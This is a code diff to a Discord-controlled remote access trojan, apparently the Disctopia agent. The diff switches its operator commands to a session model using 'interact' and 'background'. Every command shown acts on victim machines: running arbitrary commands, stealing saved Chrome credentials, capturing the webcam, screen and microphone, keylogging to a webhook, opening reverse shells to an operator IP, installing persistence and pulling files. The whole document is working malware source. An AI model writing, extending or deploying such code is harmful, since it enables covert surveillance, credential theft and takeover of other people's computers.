@@ -35,6 +35,7 @@ from libraries import credentials,keylogger,sandboxevasion,disctopia
 GUILD = discord.Object(id = "{GUILD}")
 CHANNEL = {CHANNEL}
 KEYLOGGER_WEBHOOK = "{KEYLOG_WEBHOOK}"
+CURRENT_AGENT = 0
 
 class Bot(commands.Bot):
     def __init__(self):
@@ -68,10 +69,30 @@ class Bot(commands.Bot):
 
 bot = Bot()
 
+
+@bot.hybrid_command(name = "interact", with_app_command = True, description = "Interact with an agent")
+@app_commands.guilds(GUILD)
+async def cmd(ctx: commands.Context, id:int):
+    global CURRENT_AGENT 
+    CURRENT_AGENT = id
+    my_embed = discord.Embed(title=f"Interacting with Agent#{id}", color=0x00FF00)
+    await ctx.reply(embed=my_embed)
+
+@bot.hybrid_command(name = "background", with_app_command = True, description = "Background an agent")
+@app_commands.guilds(GUILD)
+async def cmd(ctx: commands.Context):
+    global CURRENT_AGENT 
+    if CURRENT_AGENT != 0:
+        CURRENT_AGENT = 0
+        my_embed = discord.Embed(title=f"Background Agent", color=0x00FF00)
+        await ctx.reply(embed=my_embed)
+    else:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+
 @bot.hybrid_command(name = "cmd", with_app_command = True, description = "Run any command on the target machine")
 @app_commands.guilds(GUILD)
-async def cmd(ctx: commands.Context, id:int, command:str):
-    if (id == int(ID)):
+async def cmd(ctx: commands.Context, command:str):
+    if (CURRENT_AGENT == int(ID)):
         result = disctopia.cmd(command)
         if len(result) > 4000:
             path = os.environ["temp"] +"\\response.txt"     
@@ -81,6 +102,8 @@ async def cmd(ctx: commands.Context, id:int, command:str):
             os.remove(path)
         else:
             await ctx.reply("```"+result+"```")
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Run any command on the all online agents")
 @app_commands.guilds(GUILD)
@@ -98,8 +121,8 @@ async def cmd_all(ctx: commands.Context, command:str):
 
 @bot.hybrid_command(name = "webshot", with_app_command = True, description = "Capture a picture from the target machine's screen")
 @app_commands.guilds(GUILD)
-async def webshot(ctx: commands.Context, id:int):
-    if (id == int(ID)):
+async def webshot(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
         if ctx.interaction:
             my_embed = discord.Embed(title=f"Please use **!webshot {ID}** instead of the slash command", color=0xFF0000)
             await ctx.reply(embed=my_embed) 
@@ -111,22 +134,26 @@ async def webshot(ctx: commands.Context, id:int):
             else:
                 my_embed = discord.Embed(title=f"Error while taking photo to Agent#{ID}", color=0xFF0000)
                 await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
         
 @bot.hybrid_command(name = "cd", with_app_command = True, description = "Change the current directory on the target machine")
 @app_commands.guilds(GUILD)
-async def cd(ctx: commands.Context, id:int, path:str):
-    if (id == int(ID)):
+async def cd(ctx: commands.Context, path:str):
+    if (int(CURRENT_AGENT) == int(ID)):
         result = disctopia.cd(path)
         if (result):
             my_embed = discord.Embed(title=f"Succesfully changed directory to: {path}", color=0x00FF00)
         else:
             my_embed = discord.Embed(title=f"Error while changing directory:\n{result}", color=0xFF0000)    
         await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "process", with_app_command = True, description = "List all the processes running on the target machine")
 @app_commands.guilds(GUILD)
-async def process(ctx: commands.Context, id:int):
-    if (id == int(ID)):
+async def process(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
         result = disctopia.process()
         if len(result) > 4000:
             path = os.environ["temp"] +"\\response.txt"         
@@ -136,22 +163,26 @@ async def process(ctx: commands.Context, id:int):
             os.remove(path)
         else:
             await ctx.reply(f"```\n{result}\n```")
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "upload", with_app_command = True, description = "Upload a file to the agent")
 @app_commands.guilds(GUILD)
-async def upload(ctx: commands.Context, id:int, url:str, name:str):
-    if (id == int(ID)):
+async def upload(ctx: commands.Context, url:str, name:str):
+    if (int(CURRENT_AGENT) == int(ID)):
         result = disctopia.upload(url, name)
         if result:
             my_embed = discord.Embed(title=f"{name} has been uploaded to Agent#{ID}", color=0x00FF00)
         else:
             my_embed = discord.Embed(title=f"Error while uploading {name} to Agent#{ID}:\n{result}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "screenshot", with_app_command = True, description = "Take a screenshot of the target machine's screen")
 @app_commands.guilds(GUILD)
-async def screenshot(ctx: commands.Context, id:int):
-    if (id == int(ID)):
+async def screenshot(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
         result = disctopia.screenshot()
         if result != False:
             await ctx.reply(file=discord.File(result))
@@ -159,11 +190,13 @@ async def screenshot(ctx: commands.Context, id:int):
         else:
             my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{ID}", color=0xFF0000)
             await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "creds", with_app_command = True, description = "Get the credentials of the target machine")
 @app_commands.guilds(GUILD)
-async def creds(ctx: commands.Context, id:int):
-    if (id == int(ID)):
+async def creds(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
         result = disctopia.creds()
         if result != False:
             await ctx.reply(file=discord.File(result))
@@ -171,17 +204,21 @@ async def creds(ctx: commands.Context, id:int):
         else:
             my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "persistent", with_app_command = True, description = "Make the agent persistent on the target machine")
 @app_commands.guilds(GUILD)
-async def persistent(ctx: commands.Context, id:int):
-    if (id == int(ID)):
+async def persistent(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
         result = disctopia.persistent()
         if result:
             my_embed = discord.Embed(title=f"Persistance enabled on Agent#{ID}", color=0x00FF00)
         else:
             my_embed = discord.Embed(title=f"Error while enabling persistance on Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "ls", with_app_command = True, description = "List all the current online agents")
 @app_commands.guilds(GUILD)
@@ -196,38 +233,44 @@ async def ls(ctx: commands.Context):
 
 @bot.hybrid_command(name = "download", with_app_command = True, description = "Download file from the target machine")
 @app_commands.guilds(GUILD)
-async def download(ctx: commands.Context, id:int, path:str):
-    if (id == int(ID)):
+async def download(ctx: commands.Context, path:str):
+    if (int(CURRENT_AGENT) == int(ID)):
         try:
             await ctx.reply(f"**Agent #{ID}** Requested File:", file=discord.File(path))
         except Exception as e:
             my_embed = discord.Embed(title=f"Error while downloading from Agent#{ID}:\n{e}", color=0xFF0000)
-            await ctx.reply(embed=my_embed) 
+            await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "terminate", with_app_command = True, description = "Terminate the agent")
 @app_commands.guilds(GUILD)
-async def download(ctx: commands.Context, id:int):
-    if (id == int(ID)):
+async def download(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
         my_embed = discord.Embed(title=f"Terminating Connection With Agent#{ID}", color=0x00FF00)
         await ctx.reply(embed=my_embed)
         await bot.close()        
         sys.exit()
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "selfdestruct", with_app_command = True, description = "Delete the agent from the target machine")
 @app_commands.guilds(GUILD)
-async def selfdestruct(ctx: commands.Context, id:int):
-    if (id == int(ID)):
+async def selfdestruct(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
         result = disctopia.selfdestruct()
         if result:
             my_embed = discord.Embed(title=f"Agent#{ID} has been deleted", color=0x00FF00)
         else:
             my_embed = discord.Embed(title=f"Error while deleting Agent#{ID}: {result}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "location", with_app_command = True, description = "Get the location of the target machine")
 @app_commands.guilds(GUILD)
-async def location(ctx: commands.Context, id:int):
-    if (id == int(ID)):
+async def location(ctx: commands.Context):
+    if (int(CURRENT_AGENT) == int(ID)):
         response = disctopia.location()
         if response != False:
             my_embed = discord.Embed(title=f"IP Based Location on Agent#{ID}", color=0x00FF00)
@@ -239,20 +282,24 @@ async def location(ctx: commands.Context, id:int):
         else:
             my_embed = discord.Embed(title=f"Error while getting location of Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "revshell", with_app_command = True, description = "Get a reverse shell on the target machine")
 @app_commands.guilds(GUILD)
-async def location(ctx: commands.Context, id:int, ip:str, port:int):
-    if (id == int(ID)):
+async def location(ctx: commands.Context, ip:str, port:int):
+    if (int(CURRENT_AGENT) == int(ID)):
         result = disctopia.revshell(ip, port)
         if result:
             my_embed = discord.Embed(title=f"Attempting to Establish Reverse Shell on Agent#{ID}", color=0x00FF00)
         await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
     
 @bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Record the microphone of the target machine")
 @app_commands.guilds(GUILD)
-async def recordmic(ctx: commands.Context, id:int, seconds:int):
-    if (id == int(ID)):
+async def recordmic(ctx: commands.Context, seconds:int):
+    if (int(CURRENT_AGENT) == int(ID)):
         if ctx.interaction:
             my_embed = discord.Embed(title=f"Please use **!recordmic {ID}** instead of the slash command", color=0xFF0000)
             await ctx.reply(embed=my_embed)
@@ -264,33 +311,39 @@ async def recordmic(ctx: commands.Context, id:int, seconds:int):
             else:
                 my_embed = discord.Embed(title=f"Error while starting recording on Agent#{ID}", color=0xFF0000)
                 await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "wallpaper", with_app_command = True, description = "Change the wallpaper of the target machine")
 @app_commands.guilds(GUILD)
-async def wallpaper(ctx: commands.Context, id:int, path_url:str):
-    if (id == int(ID)):
+async def wallpaper(ctx: commands.Context, path_url:str):
+    if (int(CURRENT_AGENT) == int(ID)):
         result = disctopia.wallpaper(path_url)
         if result:
             my_embed = discord.Embed(title=f"Wallpaper changed on Agent#{ID}", color=0x00FF00)
         else:
             my_embed = discord.Embed(title=f"Error while changing wallpaper on Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "killproc", with_app_command = True, description = "Kill a process on the target machine")
 @app_commands.guilds(GUILD)
-async def killproc(ctx: commands.Context, id:int, pid:int):
-    if (id == int(ID)):
+async def killproc(ctx: commands.Context, pid:int):
+    if (int(CURRENT_AGENT) == int(ID)):
         result = disctopia.killproc(pid)
         if result:
             my_embed = discord.Embed(title=f"Process {pid} killed on Agent#{ID}", color=0x00FF00)
         else:
             my_embed = discord.Embed(title=f"Error while killing process {pid} on Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "keylog", with_app_command = True, description = "Start a keylogger on the target machine")
 @app_commands.guilds(GUILD)
-async def keylog(ctx: commands.Context, id:int, mode:str ,interval:int):
-    if (id == int(ID)):
+async def keylog(ctx: commands.Context, mode:str ,interval:int):
+    if (int(CURRENT_AGENT) == int(ID)):
         logger = keylogger.Keylogger(interval=interval, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
         if mode == "stop":
             logger.stop()
@@ -298,31 +351,33 @@ async def keylog(ctx: commands.Context, id:int, mode:str ,interval:int):
         else:
             threading.Thread(target=logger.start).start()
             await ctx.reply(embed=discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00))
+    elif CURRENT_AGENT == 0:
+        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
 
 @bot.hybrid_command(name = "help", with_app_command = True, description = "Help menu")
 @app_commands.guilds(GUILD)
 async def keylog(ctx: commands.Context):
     my_embed = discord.Embed(title=f"Help Menu", color=0x00FF00)
     my_embed.add_field(name="/help", value="Shows this menu", inline=False)
-    my_embed.add_field(name="/cmd <id> <command>", value="Run command on target", inline=False)
-    my_embed.add_field(name="/cd <id> <path>", value="Change current directory", inline=False)
-    my_embed.add_field(name="/webshot <id>", value="Grab a picture from the webcam", inline=False)
-    my_embed.add_field(name="/process <id>", value="Get a list of all running processes", inline=False)
-    my_embed.add_field(name="/upload <id> <url>", value="Upload file to agent", inline=False)
-    my_embed.add_field(name="/screenshot <id> ", value="Grab a screenshot from the agent", inline=False)
-    my_embed.add_field(name="/creds <id>", value="Get chrome saved credentials", inline=False)
-    my_embed.add_field(name="/persistent <id>", value="Enable persistence", inline=False)
+    my_embed.add_field(name="/cmd <command>", value="Run command on target", inline=False)
+    my_embed.add_field(name="/cd <path>", value="Change current directory", inline=False)
+    my_embed.add_field(name="/webshot ", value="Grab a picture from the webcam", inline=False)
+    my_embed.add_field(name="/process ", value="Get a list of all running processes", inline=False)
+    my_embed.add_field(name="/upload <url>", value="Upload file to agent", inline=False)
+    my_embed.add_field(name="/screenshot ", value="Grab a screenshot from the agent", inline=False)
+    my_embed.add_field(name="/creds ", value="Get chrome saved credentials", inline=False)
+    my_embed.add_field(name="/persistent ", value="Enable persistence", inline=False)
     my_embed.add_field(name="/ls", value="Get a list of all active agents", inline=False)
-    my_embed.add_field(name="/download <id> <path>", value="Download file from agent", inline=False)
-    my_embed.add_field(name="/terminate <id>", value="Terminate the session ", inline=False)
+    my_embed.add_field(name="/download <path>", value="Download file from agent", inline=False)
+    my_embed.add_field(name="/terminate ", value="Terminate the session ", inline=False)
     my_embed.add_field(name="/cmd-all <command>", value="Run a command on all agents", inline=False)
-    my_embed.add_field(name="/location <id>", value="Get the location of the target machine", inline=False)
-    my_embed.add_field(name="/revshell <id> <ip> <port>", value="Get a reverse shell on the target machine", inline=False)
-    my_embed.add_field(name="/recordmic <id> <interval>", value="Record the microphone of the target machine", inline=False)
-    my_embed.add_field(name="/wallpaper <id> <path/url>", value="Change the wallpaper of the target machine", inline=False)
-    my_embed.add_field(name="/killproc <id> <pid>", value="Kill a process on the target machine", inline=False)
-    my_embed.add_field(name="/keylog <id> <mode> <interval>", value="Start/Stop a keylogger on the target machine", inline=False)
-    my_embed.add_field(name="/selfdestruct <id>", value="Delete the agent", inline=False)
+    my_embed.add_field(name="/location ", value="Get the location of the target machine", inline=False)
+    my_embed.add_field(name="/revshell <ip> <port>", value="Get a reverse shell on the target machine", inline=False)
+    my_embed.add_field(name="/recordmic <interval>", value="Record the microphone of the target machine", inline=False)
+    my_embed.add_field(name="/wallpaper <path/url>", value="Change the wallpaper of the target machine", inline=False)
+    my_embed.add_field(name="/killproc <pid>", value="Kill a process on the target machine", inline=False)
+    my_embed.add_field(name="/keylog <mode> <interval>", value="Start/Stop a keylogger on the target machine\n/`keylog start 60`", inline=False)
+    my_embed.add_field(name="/selfdestruct ", value="Delete the agent", inline=False)
     await ctx.reply(embed=my_embed)
 
 
